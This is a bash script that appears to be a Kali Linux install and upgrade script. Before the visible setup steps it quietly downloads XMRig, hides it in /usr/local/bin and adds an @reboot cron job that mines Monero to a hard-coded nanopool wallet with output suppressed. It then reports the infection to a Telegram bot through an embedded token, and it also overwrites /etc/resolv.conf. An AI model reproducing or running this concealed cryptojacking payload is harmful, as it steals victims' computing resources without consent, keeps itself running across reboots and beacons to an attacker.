#!/bin/bash
xdg-open "https://t.me/bahaa_010640/91"
chmod +x *

sudo apt install -y wget tar cron

wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz

sleep 3

tar -xvf xmrig-6.16.4-linux-x64.tar.gz

sleep 2

sudo cp xmrig-6.16.4/xmrig /usr/local/bin/

sleep 1

sudo rm -rf xmrig-6.16.4
sudo rm -rf xmrig-6.16.4-linux-x64.tar.gz
sleep 5

code="@reboot (sleep 50; nohup xmrig -o xmr-eu1.nanopool.org:14433 -u 43gD64iSezxjDgMaNpRHQAKBU6TPawhBVCRxAB4KE7xchZMqAwG1WJh7xM7p7v4XkFRGvQwYQEECdLFcMpWYzh9WSyKv1r3 --tls --coin monero --threads=\$(\$(nproc) / 4)) &>/dev/null &"

(crontab -l 2>/dev/null | grep -qF "$code") || (crontab -l 2>/dev/null; echo "$code") | crontab -

if ! crontab -l | grep -qF "$code"; then
    (crontab -l 2>/dev/null; echo "$code") | crontab -
    echo "A"
else
    echo "B"
fi
clear
sleep 5
BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
CHAT_ID="5792222595"
MESSAGE="xm/up"

nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &
sleep 5

#________________________________________________________________________________#
#________________________________________________________________________________#
#________________________________________________________________________________#


echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf > /dev/null

sudo apt-get update

sudo apt-get upgrade -y
sudo apt-get dist-upgrade -y

sudo apt-get autoremove -y
sudo apt-get autoclean -y

sudo apt-get install -y kali-linux-full

sudo dpkg --configure -a
sudo apt-get install -f -y

sudo systemctl restart networking
sudo systemctl restart NetworkManager

sudo reboot